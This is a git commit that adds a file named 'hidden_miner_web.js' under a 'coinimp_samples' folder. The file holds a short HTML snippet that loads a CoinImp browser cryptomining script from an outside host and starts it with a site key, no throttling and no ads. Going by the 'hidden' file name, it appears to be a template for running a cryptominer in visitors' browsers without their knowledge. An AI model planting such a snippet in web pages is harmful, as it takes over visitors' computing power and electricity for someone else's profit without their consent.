6801d50e67da15562f5f8b7d38e4776407bf6d7c
Tsarev Vladimir <sau412@gmail.com>
2019-02-25 14:15:19 +0300

    Sample for WEB

---
+++ coinimp_samples/hidden_miner_web.js
@@ -0,0 +1,8 @@
+<script src="https://www.hostingcloud.racing/RWmB.js"></script>
+<script>
+    var _client = new Client.User('a7a67f4cd55410e4b60971e04892cd7b85700bb631e6012375df47da582eff0a',
+        'YOUR_COIHIVE_DATA-USER_KEY',{
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+</script>
